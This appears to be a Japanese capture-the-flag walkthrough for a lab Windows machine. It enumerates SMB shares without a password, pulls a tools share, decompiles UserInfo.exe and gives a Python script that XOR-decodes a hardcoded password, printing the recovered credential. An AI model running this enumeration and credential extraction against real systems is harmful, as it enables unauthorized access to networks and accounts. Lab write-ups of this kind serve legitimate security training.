まずsmbシェアをみると、みなれない"support-tools"なるものがある。

```
┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
└─$ smbclient -L 10.10.11.174 

Password for [WORKGROUP\shoebill]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share 
  ```
  
 パスワード無しで、support-toolsにアクセスして中身のファイルやフォルダを確認する。
 
 ```
┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
└─$ smbclient //10.10.11.174/support-tools
Password for [WORKGROUP\shoebill]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Jul 21 02:01:06 2022
  ..                                  D        0  Sat May 28 20:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 20:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 20:19:55 2022
  putty.exe                           A  1273576  Sat May 28 20:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 20:19:31 2022
  UserInfo.exe.zip                    A   277499  Thu Jul 21 02:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 20:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 20:19:43 2022
```

以下のようにして再帰的にすべてダウンロードする。

```
smb: \> mask ''
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
```
得られたファイルのうち"UserInfo.exe.zip"にユーザの情報がありそうなので、これを解凍してdnSpyで解析する。

```
┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174/support-tools]
└─$ unzip UserInfo.exe.zip
```
UserInfo.exeをdnSpyでみると、暗号化されたパスワードと、キー、そしてパスワードを生成するような関数が見つかる。

![dnspy](https://user-images.githubusercontent.com/85237728/194679210-75055544-fd20-497f-bbca-8caedabb954e.png)

XORは二回繰り返すとと元に戻るので、このコードを参考にPythonスクリプトを書く。

```python
#!/usr/bin/env python3
from base64 import b64decode
from pwn import *

array = b64decode('0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E')
key = bytes('armando', 'utf-8')
ans = b''
for i in range(len(array)):
    temp = array[i] ^ key[i % len('armando')] ^ 223
    ans += pack(temp, 'all')

print('ans:', ans)
```
実行すると生のパスワードを得る。

```
┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
└─$ python3 decryptor.py
ans: b'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

